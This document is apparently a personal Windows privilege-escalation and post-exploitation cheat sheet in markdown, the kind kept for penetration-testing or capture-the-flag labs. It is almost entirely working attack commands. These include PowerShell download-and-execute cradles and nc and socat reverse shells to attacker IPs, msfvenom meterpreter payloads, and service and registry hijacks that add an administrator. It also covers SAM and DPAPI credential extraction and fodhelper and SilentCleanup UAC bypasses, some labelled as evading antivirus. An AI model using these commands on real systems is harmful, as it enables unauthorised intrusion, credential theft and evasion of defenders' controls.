# payloads

## Downloading Files

```
#download and execute at the same time
powershell.exe IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.41:8000/JuicyPotato.exe','C:/Users/kohsuke/Desktop/JuicyPotato.exe')"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.14:7898/file.exe', 'file.exe')"

powershell -c '(Invoke-RestMethod -Uri "http://10.10.14.3:8000/JuicyPotato.exe" -Method Get -OutFile "jp.exe")'

powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.14:7898/file.exe' -OutFile 'file.exe'"

powershell -c "$url = 'http://10.10.10.14:7898/file.exe'; $stream = [System.IO.StreamReader]::new($url); $content = $stream.ReadToEnd(); Set-Content -Path 'file.exe' -Value $content -Encoding Byte"

powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.10.14:7898/file.exe', 'file.exe')"

powershell -c "$url = 'http://10.10.10.14:7898/file.exe'; $request = [System.Net.HttpWebRequest]::Create($url); $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $output = [System.IO.File]::Create('file.exe'); $stream.CopyTo($output); $output.Close(); $response.Close()"

certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe

bitsadmin /transfer myDownload /priority normal http://10.10.14.3:8000/JuicyPotato.exe jp.exe

sudo smbserver.py share .

copy \\10.10.14.14\share\churrasco.exe c.exe

nc -nv TARGET_IP 1234 < received_file

nc -nlvp 1234 > file_to_send

On the receiving end running,

nc -l -p 1234 > out.file
will begin listening on port 1234.

On the sending end running,

nc -w 3 [destination] 1234 < out.file

curl

wget

scp example.txt user@192.168.1.100:/path/to/destination/

scp user@192.168.1.100:/path/to/file.txt /path/on/local/machine/


echo c:\Users\kohsuke\Desktop\nc.exe 10.10.14.41 4455 -e cmd.exe > reverse.bat
```

## File Permission Exploit

```
# 777 exe file ?

#Check if startup programs have write access
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f exe > rev.exe
# Place rev.exe in "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup".

#Check if AlwaysInstallElevated” value is 1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f msi > setup.msi
msiexec /quiet /qn /i C:\Temp\setup.msi

# "User-PC\User" has the "SERVICE_CHANGE_CONFIG" permission.
 sc config daclsvc binpath= "net localgroup administrators user /add"
 sc start daclsvc

# "BINARY_PATH_NAME" field displays a path that is not confined between quotes
sc qc unquotedsvc
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: sc start unquotedsvc

# Has "FullContol" permission over the registry key?

Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
windows_service.c 
#include <stdlib.h> // Include the necessary header file

int main() {
    system("cmd.exe /k net localgroup administrators user /add"); // Use system() function to execute the command
    return 0;
}

x86_64-w64-mingw32-gcc windows_service.c -o x.exe 

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

sc start regsvc

```

## Metasploit Windows Reverse Shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

```

## Manual Windows Reverse Shell

```
python3 -m http.server

#to get reverse shell from your kali
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4567 -f aspx > letmein.aspx 

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4567 

cd C:\Windows\Temp
certutil -urlcache -f http://YOUR_IP:PORT/filename.exe renamed.exe
```

## Metasploit Windows suggester

```
background

use post/multi/recon/local_exploit_suggester

run SESSION=1
```

## Windows System Enumeration

```
systeminfo

#32bit ? 64bit ? 68bit ?
wmic os get osarchitecture
```

![image](https://github.com/J4CKMEISTER/Jack-of-All-BL4D3S/assets/78603128/8cfbe647-00a2-4016-86b2-143e539bedde)

```
systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"

wmic qfe

wmic qfe Caption,Description,HotFixID,InstalledOn

wmic logicaldisk

wmic logicaldisk get caption,description,providername

wmic logicaldisk get caption
```

## Windows User Enumeration

```
whoami

whoami /priv

whoami /groups

net user

net user jack

net localgroup

net localgroup administrators
```

## Windows Network Enumeration

```
netstat -ano | findstr "LISTEN"

ipconfig

ipconfig /all

#Check Incoming / Outgoing Network Traffic
arp -a

#Check route table
route print

#Check open ports
netstat -ano
```

## Windows Password Hunting

```
#find 'password' in current directory with extension of txt,ini and config
findstr /si password *.txt *.ini *.config

#find 'password' in whole C: directory
dir /s C:\* | findstr /i "password"

dir /r 
dir /l /a 

#Common sus file places
C:\Users\Public
C:\Users\Test\AppData\Roaming

#Finding credential location
cmdkey /list

runas /usr:ACCESS\Administrator /savecred cmd /c 

runas /usr:ACCESS\Administrator /savecred "cmd /c C:\Users\security\Desktop\nc.exe 10.10.14.17 4567 -e cmd.exe"
```

## Credential Extracting

```

reg.exe save hklm\sam C:\xampp\htdocs\oscommerce-2.3.4\sam.save
reg.exe save hklm\security C:\xampp\htdocs\oscommerce-2.3.4\security.save
reg.exe save hklm\system C:\xampp\htdocs\oscommerce-2.3.4\system.save

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

cd Windows/System32/config
secretsdump.py LOCAL -system ./SYSTEM -sam ./SAM



#cache files

#Must have admin accesss
powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.17:8000/seatbelt.exe', 'sb.exe')"

sb.exe MasterKeys
sb.exe users

# cd to MasterKey file directory
cd C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001

# encode and print the masterkey
certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output

# save it into local machine
type output 

https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
```

## AV Enumeration

```
#Check Window Defender is up or down
sc query windefend

#Check running services
sc queryx type= service

#Check FireWall Status
netsh advfirewall firewall dump
netsh firewall show state 

#Check FireWall configuration
netsh firewall show config
```

## Bypass UAC

```
UAC = Prompt ask admin for confirmation yes and no

System Configuration
run "msconfig" can bypass the prompt
then launch cmd = get system

Authorization Manager
run "azman.msc"
Help -> Help Topics -> Right Click MMC -> view source

File -> open -> go find cmd.exe at C:\Windows\System32 -> right click the icon

Auto Elevate = no need prompt
Conditions:
Signed by windows publisher
Inside trusted directory like System32 , ProgramFiles

sigcheck : help identify auto-evelate on or off

fodhelper : manage window additional language and more
- no need gui can exec

When checking HKEY_CLASSES_ROOT, if there is a user-specific association at HKEY_CURRENT_USER (HKCU), 
it will take priority. If no user-specific association is configured, then the system-wide association 
at HKEY_LOCAL_MACHINE (HKLM) will be used instead


C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.

run fodhelper.exe

reg delete HKCU\Software\Classes\ms-settings\ /f



Windows AV detected
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f 

fodhelper.exe  

==================================================================================================================
Windows AV detected v2 but still can run (RACE CONDITION)

set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Users\kostas\Desktop\nc.exe 10.10.14.14:4747 -e cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

(because these 2 run together)
reg add %REG_KEY% /d %CMD% /f & fodhelper.exe  
====================================================================================================================
powershell detected AV

$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:10.8.17.213:4445 EXEC:cmd.exe,pipes"

New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force

Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force

New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force

Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force

Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

======================================================================================================================
Translated powershell to cmd undetected BY AV

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:192.168.146.141:4556 EXEC:cmd.exe,pipes"

set CMD="powershell -windowstyle hidden C:\Users\ASUS\Downloads\nc64.exe TCP:192.168.146.141:4556 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

==============================================================

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.jack\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".jack" /f


reg delete "HKCU\Software\Classes\.thm\" /f
reg delete "HKCU\Software\Classes\ms-settings\" /f


==========================================

BYPASSING ALWAYS NOTIFIY
-Schedule Task will not prompt user


"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "

reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.8.17.213:4446 EXEC:cmd.exe,pipes &REM " /f

reg delete "HKCU\Environment" /v "windir" /f


reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.8.17.213:4446 EXEC:cmd.exe,pipes &REM " /f
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
reg delete "HKCU\Environment" /v "windir" /f



```

## Read Permissions

```
#possible if user is also admin
icacls C:\Users\Administrator\Desktop\root.txt /grant username:F

icacls C:\Windows\System32\net.exe /grant username:username:F

"F" for Full control, "M" for Modify, "R" for Read, "W" for Write, "X" for Execute

```

## Finding exe files

```
where /R c:\windows bash.exe
where /R c:\windows wsl.exe
```

## Login methods

```
 psexec.py administrator:'password'@MACHINE_IP
 
 smbexec.py administrator:'password'@MACHINE_IP
 
 wmiexec.py administrator:'password'@MACHINE_IP
```

## References

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_windows.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation

https://github.com/SecWiki/windows-kernel-exploits
